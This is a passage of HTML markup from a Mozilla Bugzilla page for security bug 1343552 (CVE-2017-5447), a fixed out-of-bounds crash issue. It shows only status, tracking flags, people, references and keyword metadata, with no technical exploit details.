            (<span id="readable-bug-status" data-readable-bug-status="{&quot;cf_status_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_status_firefox51&quot;:&quot;wontfix&quot;,&quot;cf_status_firefox52&quot;:&quot;wontfix&quot;,&quot;status&quot;:&quot;VERIFIED&quot;,&quot;cf_tracking_firefox95&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr45&quot;:&quot;53+&quot;,&quot;cf_a11y_review_project_flag&quot;:&quot;---&quot;,&quot;cf_root_cause&quot;:&quot;---&quot;,&quot;cf_status_firefox95&quot;:&quot;---&quot;,&quot;cf_tracking_firefox54&quot;:&quot;+&quot;,&quot;cf_tracking_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr52&quot;:&quot;53+&quot;,&quot;cf_status_firefox54&quot;:&quot;verified&quot;,&quot;cf_tracking_firefox53&quot;:&quot;+&quot;,&quot;resolution&quot;:&quot;FIXED&quot;,&quot;cf_status_firefox53&quot;:&quot;verified&quot;,&quot;target_milestone&quot;:&quot;mozilla55&quot;,&quot;cf_status_thunderbird_esr91&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr45&quot;:&quot;verified&quot;,&quot;priority&quot;:&quot;--&quot;,&quot;cf_tracking_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr52&quot;:&quot;verified&quot;,&quot;cf_tracking_firefox93&quot;:&quot;---&quot;,&quot;cf_status_thunderbird_esr78&quot;:&quot;---&quot;,&quot;id&quot;:1343552,&quot;dupe_of&quot;:null,&quot;cf_tracking_firefox94&quot;:&quot;---&quot;,&quot;keywords&quot;:[&quot;assertion&quot;,&quot;crash&quot;,&quot;csectype-bounds&quot;,&quot;sec-high&quot;,&quot;testcase&quot;],&quot;cf_tracking_thunderbird_esr91&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr78&quot;:&quot;---&quot;,&quot;flags&quot;:[{&quot;status&quot;:&quot;+&quot;,&quot;name&quot;:&quot;in-testsuite&quot;}],&quot;cf_webcompat_priority&quot;:&quot;---&quot;,&quot;cf_status_firefox55&quot;:&quot;verified&quot;,&quot;cf_tracking_firefox_sumo&quot;:&quot;---&quot;,&quot;cf_status_firefox93&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_relnote&quot;:&quot;---&quot;,&quot;cf_tracking_firefox55&quot;:&quot;+&quot;,&quot;cf_status_firefox94&quot;:&quot;---&quot;,&quot;cf_fission_milestone&quot;:&quot;---&quot;,&quot;cf_tracking_thunderbird_esr78&quot;:&quot;---&quot;}"></span>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-tracking-content"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-status-view"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-view-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-view">VERIFIED
        FIXED
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-status-edit" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-edit-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-edit"><div class="field inline" id="field-bug_status"
>


  
    <div class="value">
        <span id="field-value-bug_status">
            VERIFIED

        </span>
    </div>

  
</div><div class="field indent inline" id="field-resolution"
>


  
    <div class="value">
        <span id="field-value-resolution">
            FIXED

        </span>
    </div>

  
</div>
  <div id="status-action-buttons">
      <div id="assigned-container" style="display:none">
        <button type="button" class="secondary" id="mark-as-assigned-btn">
          Mark as Assigned
        </button>
      </div>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-target_milestone"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone" id="target_milestone-help-link" class="help">Milestone:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-target_milestone">
            mozilla55

        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_iteration" style="display:none"
>
    <div class="name">Iteration:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_iteration">
            ---

        </span>
    </div>

  
</div>


      <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Project Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <td class="tracking-flag-name">a11y-review</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_a11y_review_project_flag-dirty">
  <select id="cf_a11y_review_project_flag" name="cf_a11y_review_project_flag">
        <option value="---"
          id="v4876_cf_a11y_review_project_flag" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Root Cause</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_root_cause-dirty">
  <select id="cf_root_cause" name="cf_root_cause">
        <option value="---"
          id="v4701_cf_root_cause" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Webcompat Priority</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_webcompat_priority-dirty">
  <select id="cf_webcompat_priority" name="cf_webcompat_priority">
        <option value="---"
          id="v4274_cf_webcompat_priority" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">user-doc-firefox</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_sumo-dirty">
  <select id="cf_tracking_firefox_sumo" name="cf_tracking_firefox_sumo">
        <option value="---"
          id="v4660_cf_tracking_firefox_sumo" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Fission Milestone</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_fission_milestone-dirty">
  <select id="cf_fission_milestone" name="cf_fission_milestone">
        <option value="---"
          id="v4222_cf_fission_milestone" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

      <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Tracking Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-hide">
    <table class="layout-table tracking-flags">
        <tr>
          <th></th>
          <th>Tracking</th>
          <th>Status</th>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr45</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox_esr45&amp;o1=equals&amp;v1=53%2B">53+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr45&amp;o1=equals&amp;v1=verified">verified</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox51</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox51&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox52</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox52&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr52</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox_esr52&amp;o1=equals&amp;v1=53%2B">53+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=equals&amp;v1=verified">verified</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox53</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox53&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox53&amp;o1=equals&amp;v1=verified">verified</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox54</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox54&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox54&amp;o1=equals&amp;v1=verified">verified</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox55</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox55&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox55&amp;o1=equals&amp;v1=verified">verified</a>
          </td>
        </tr>
    </table>
  </div>


<div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <th></th>
        <th>Tracking</th>
        <th>Status</th>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr45</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr45-dirty">
  <select id="cf_tracking_firefox_esr45" name="cf_tracking_firefox_esr45">
        <option value="53+"
          id="v2927_cf_tracking_firefox_esr45" selected
        >53+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr45-dirty">
  <select id="cf_status_firefox_esr45" name="cf_status_firefox_esr45">
        <option value="verified"
          id="v2549_cf_status_firefox_esr45" selected
        >verified
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">relnote-firefox</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_relnote-dirty">
  <select id="cf_tracking_firefox_relnote" name="cf_tracking_firefox_relnote">
        <option value="---"
          id="v539_cf_tracking_firefox_relnote" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr78-dirty">
  <select id="cf_tracking_thunderbird_esr78" name="cf_tracking_thunderbird_esr78">
        <option value="---"
          id="v4823_cf_tracking_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr78-dirty">
  <select id="cf_status_thunderbird_esr78" name="cf_status_thunderbird_esr78">
        <option value="---"
          id="v4829_cf_status_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr91-dirty">
  <select id="cf_tracking_thunderbird_esr91" name="cf_tracking_thunderbird_esr91">
        <option value="---"
          id="v5236_cf_tracking_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr91-dirty">
  <select id="cf_status_thunderbird_esr91" name="cf_status_thunderbird_esr91">
        <option value="---"
          id="v5242_cf_status_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox51</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox51-dirty">
  <select id="cf_status_firefox51" name="cf_status_firefox51">
        <option value="wontfix"
          id="v2910_cf_status_firefox51" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox52</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox52-dirty">
  <select id="cf_status_firefox52" name="cf_status_firefox52">
        <option value="wontfix"
          id="v2969_cf_status_firefox52" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr52</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr52-dirty">
  <select id="cf_tracking_firefox_esr52" name="cf_tracking_firefox_esr52">
        <option value="53+"
          id="v3128_cf_tracking_firefox_esr52" selected
        >53+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr52-dirty">
  <select id="cf_status_firefox_esr52" name="cf_status_firefox_esr52">
        <option value="verified"
          id="v3138_cf_status_firefox_esr52" selected
        >verified
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox53</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox53-dirty">
  <select id="cf_tracking_firefox53" name="cf_tracking_firefox53">
        <option value="+"
          id="v2998_cf_tracking_firefox53" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox53-dirty">
  <select id="cf_status_firefox53" name="cf_status_firefox53">
        <option value="verified"
          id="v3008_cf_status_firefox53" selected
        >verified
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr78-dirty">
  <select id="cf_tracking_firefox_esr78" name="cf_tracking_firefox_esr78">
        <option value="---"
          id="v4808_cf_tracking_firefox_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr78-dirty">
  <select id="cf_status_firefox_esr78" name="cf_status_firefox_esr78">
        <option value="---"
          id="v4813_cf_status_firefox_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr91-dirty">
  <select id="cf_tracking_firefox_esr91" name="cf_tracking_firefox_esr91">
        <option value="---"
          id="v5194_cf_tracking_firefox_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr91-dirty">
  <select id="cf_status_firefox_esr91" name="cf_status_firefox_esr91">
        <option value="---"
          id="v5199_cf_status_firefox_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox54</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox54-dirty">
  <select id="cf_tracking_firefox54" name="cf_tracking_firefox54">
        <option value="+"
          id="v3038_cf_tracking_firefox54" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox54-dirty">
  <select id="cf_status_firefox54" name="cf_status_firefox54">
        <option value="verified"
          id="v3048_cf_status_firefox54" selected
        >verified
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox55</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox55-dirty">
  <select id="cf_tracking_firefox55" name="cf_tracking_firefox55">
        <option value="+"
          id="v3175_cf_tracking_firefox55" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox55-dirty">
  <select id="cf_status_firefox55" name="cf_status_firefox55">
        <option value="verified"
          id="v3185_cf_status_firefox55" selected
        >verified
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox93</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox93-dirty">
  <select id="cf_tracking_firefox93" name="cf_tracking_firefox93">
        <option value="---"
          id="v5266_cf_tracking_firefox93" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox93-dirty">
  <select id="cf_status_firefox93" name="cf_status_firefox93">
        <option value="---"
          id="v5271_cf_status_firefox93" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox94</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox94-dirty">
  <select id="cf_tracking_firefox94" name="cf_tracking_firefox94">
        <option value="---"
          id="v5284_cf_tracking_firefox94" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox94-dirty">
  <select id="cf_status_firefox94" name="cf_status_firefox94">
        <option value="---"
          id="v5289_cf_status_firefox94" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox95</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox95-dirty">
  <select id="cf_tracking_firefox95" name="cf_tracking_firefox95">
        <option value="---"
          id="v5311_cf_tracking_firefox95" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox95-dirty">
  <select id="cf_status_firefox95" name="cf_status_firefox95">
        <option value="---"
          id="v5316_cf_status_firefox95" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>

</div>
  </div>
</section>



<section class="module" id="module-people"
>
    <header id="module-people-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse People section"
           data-label-collapsed="Expand People section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-people-content"
             aria-expanded="false"
             aria-labeledby="module-people-title"
             aria-describedby="module-people-subtitle"></div>
        <h2 class="module-title" id="module-people-title">People</h2>
          <h3 class="module-subtitle" id="module-people-subtitle">
            (Reporter: ifratric, Assigned: mats)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-people-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-assigned_to"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to"><div class="vcard vcard_5168" ><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=5168" > <span class="fna">mats</span></a>
</div>
        </span>
    </div>

  
</div><div class="field edit-show" id="field-assigned_to" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-assignee" name="set_default_assignee" class="set-default"
          value="1" data-for="assigned_to">
        <label for="set-default-assignee">Reset Assignee to default</label>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-bug_mentors" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor" id="bug_mentors-help-link" class="help">Mentors:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_mentors">---
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-qa_contact" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact" id="qa_contact-help-link" class="help">QA Contact:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-qa_contact">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-qa-contact" name="set_default_qa_contact" class="set-default"
          value="1" data-for="qa_contact">
        <label for="set-default-qa-contact">Reset QA Contact to default</label>
      </div>
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-reporter"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter" id="reporter-help-link" class="help">Reporter:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-reporter">
            <div class="vcard vcard_589159" ><img src="https://secure.gravatar.com/avatar/b046be2bb71e904ec3b1a5a1176b3443?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=589159" > <span class="fna">ifratric</span></a>
</div>

        </span>
    </div>

  
</div>

    <div class="field" id="field-triage_owner"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner" id="triage_owner-help-link" class="help">Triage Owner:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-triage_owner">
            <div class="vcard vcard_329583" ><img src="https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=329583" > <span class="fna">jfkthame</span></a>
</div>

        </span>
    </div>

  
</div>

    

    <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc" id="-help-link" class="help">CC:
        </a>
    </div>


  
    <div class=" container">


        <span aria-owns="cc-summary cc-latch">
          <span role="button" tabindex="0" id="cc-summary" data-count="15">15 people
          </span>
        </span>


        <div id="cc-list" style="display:none"></div>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-references"
>
    <header id="module-references-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse References section"
           data-label-collapsed="Expand References section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-references-content"
             aria-expanded="false"
             aria-labeledby="module-references-title"
             aria-describedby="module-references-subtitle"></div>
        <h2 class="module-title" id="module-references-title">References</h2>
          <h3 class="module-subtitle" id="module-references-subtitle">
            (<div class="link">
    <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1160" target="_blank"
      rel="noreferrer" title="https://bugs.chromium.org/p/project-zero/issues/detail?id=1160"
      class="bug-url" data-safe="1">URL</a>
  </div>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-references-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug-list edit-show" id="field-dependson" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson" id="dependson-help-link" class="help">Depends on:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-dependson">
        ---
        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-blocked" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks" id="blocked-help-link" class="help">Blocks:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-blocked">
        ---
        </span>
    </div>

  
</div>

    <div class="field bug-list edit-show" id="field-regresses" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses" id="regresses-help-link" class="help">Regressions:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regresses">
        ---
        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-regressed_by" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by" id="regressed_by-help-link" class="help">Regressed by:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regressed_by">
        ---
        </span>
    </div>

  
</div>

    
</div><div class="fields-rhs">

    <div class="field" id="field-bug_file_loc"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc" id="bug_file_loc-help-link" class="help">URL:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_file_loc"><div class="link">
    <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1160" target="_blank"
      rel="noreferrer" title="https://bugs.chromium.org/p/project-zero/issues/detail?id=1160"
      class="bug-url" data-safe="1">bugs.chromium.org/p/project-zero/issu...</a>
  </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-see_also" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also" id="see_also-help-link" class="help">See Also:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-see_also">
        ---
        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-details"
>
    <header id="module-details-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Details section"
           data-label-collapsed="Expand Details section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-details-content"
             aria-expanded="false"
             aria-labeledby="module-details-title"
             aria-describedby="module-details-subtitle"></div>
        <h2 class="module-title" id="module-details-title">Details</h2>
          <h3 class="module-subtitle" id="module-details-subtitle">
            (5 keywords, Whiteboard: [adv-main53+][adv-esr52.1+][adv-esr45.9+])
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-details-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-show" id="field-alias" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias" id="alias-help-link" class="help">Alias:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-alias">
            CVE-2017-5447

        </span>
    </div>

  
</div>

    <div class="field" id="field-keywords"
>
    <div class="name">
        <a href="/describekeywords.cgi" id="keywords-help-link" class="help">Keywords:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-keywords">
          <a href="/buglist.cgi?keywords=assertion&amp;resolution=---">assertion</a>, 
          <a href="/buglist.cgi?keywords=crash&amp;resolution=---">crash</a>, 
          <a href="/buglist.cgi?keywords=csectype-bounds&amp;resolution=---">csectype-bounds</a>, 
          <a href="/buglist.cgi?keywords=sec-high&amp;resolution=---">sec-high</a>, 
          <a href="/buglist.cgi?keywords=testcase&amp;resolution=---">testcase</a>
        </span>
    </div>

  
</div>

    <div class="field" id="field-status_whiteboard"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/Whiteboard" id="status_whiteboard-help-link" class="help">Whiteboard:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-status_whiteboard">[adv-main53+][adv-esr52.1+][adv-esr45.9+]
        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_qa_whiteboard" style="display:none"
>
    <div class="name">QA Whiteboard:
    </div>


  
    <div class="value">
        <span id="field-value-cf_qa_whiteboard">
        ---
        </span>
    </div>

  
</div>

    

    <div class="field edit-show" id="field-cf_has_regression_range" style="display:none"
>
    <div class="name">Has Regression Range:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_regression_range">
            ---

        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_has_str" style="display:none"
>
    <div class="name">Has STR:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_str">
            ---

        </span>
    </div>

  
</div>

    <div class="field" id="field-votes"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes" id="votes-help-link" class="help">Votes:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-votes">0
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-bug_flags"
>
    <div class="name">Bug Flags:
    </div>


  
    <div class=" container">
        <span id="field-value-bug_flags"><div id="bug-flags" class="flags">
  <table class="layout-table">
          <tbody class="edit-hide"><tr>
    <td class="flag-setter"><div class="vcard vcard_5168" ><a class="email " href="/user_profile?user_id=5168" > <span class="fna">mats</span></a>
</div>
    </td>

    <td class="flag-name">
        <a href="#a42092287_5168"
            class="rel-time-title activity-ref"
            title="5 years ago"
        data-time="1489186769"
      >in-testsuite</a>
    </td>

    <td class="flag-value">+
    </td>

  </tr>
          </tbody>
          <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter"><div class="vcard vcard_5168" ><a class="email " href="/user_profile?user_id=5168" > <span class="fna">mats</span></a>
</div>
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag-1543768">in-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag-1543768-dirty">
      <select id="flag-1543768" name="flag-1543768"
        title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" selected>+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr>
          </tbody>
    <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?" for="flag_type-930">behind-pref</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-930-dirty">
      <select id="flag_type-930" name="flag_type-930"
        title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?"
        class="bug-flag">
          <option value="X"></option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag tracking inclusion in the desktop Firefox product backlog." for="flag_type-846">firefox-backlog</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-846-dirty">
      <select id="flag_type-846" name="flag_type-846"
        title="Flag tracking inclusion in the desktop Firefox product backlog."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug." for="flag_type-803">sec-bounty</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-803-dirty">
      <select id="flag_type-803" name="flag_type-803"
        title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
      </select>
    </td>


  </tr><tr>
